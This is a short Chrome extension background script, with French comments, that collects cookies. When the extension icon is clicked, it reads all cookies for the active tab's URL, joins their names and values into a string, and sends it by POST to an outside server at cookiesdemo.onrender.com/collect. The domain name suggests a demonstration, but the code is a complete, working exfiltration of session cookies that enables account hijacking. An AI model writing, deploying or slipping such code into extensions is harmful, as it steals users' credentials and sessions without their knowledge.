chrome.action.onClicked.addListener(async (tab) => {
  if (!tab.url) return;

  chrome.cookies.getAll({ url: tab.url }, (cookies) => {
    if (!cookies || cookies.length === 0) {
      console.log("aucun cookies trouvés !");
      return;
    }

    const cookieString = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    console.log("Cookies récupérés :", cookieString);

    // Envoi vers le serveur Render
    fetch("https://cookiesdemo.onrender.com/collect", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ cookies: cookieString })
    })
      .then(() => console.log("Cookies envoyés au serveur !"))
      .catch(err => console.error("Erreur :", err));
  });
});
